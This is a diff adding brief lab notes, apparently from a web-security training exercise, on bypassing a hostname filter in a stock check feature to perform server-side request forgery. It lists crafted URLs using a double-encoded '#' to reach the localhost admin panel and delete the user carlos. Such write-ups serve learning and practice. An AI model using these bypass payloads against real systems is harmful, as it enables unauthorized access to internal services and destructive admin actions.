@@ -1,0 +1,13 @@
+Lab: SSRF with blacklist-based input filter
+
+Vulnerable feature: Stock check functionality.
+
+Goal: change the stock check URL to access the admin interface at http://localhost/admin and delete the user carlos.
+
+Analysis:
+local host: http://localhost%2523@stock.weliketoshop.net
+Bypassed their white list filter which says that the hostname should be stock.weliketoshop.net, so we used # for url fragmentation.
+
+admin interface: http://localhost%2523@stock.weliketoshop.net/admin
+
+delete user: http://localhost%2523@stock.weliketoshop.net/admin/delete?username=carlos
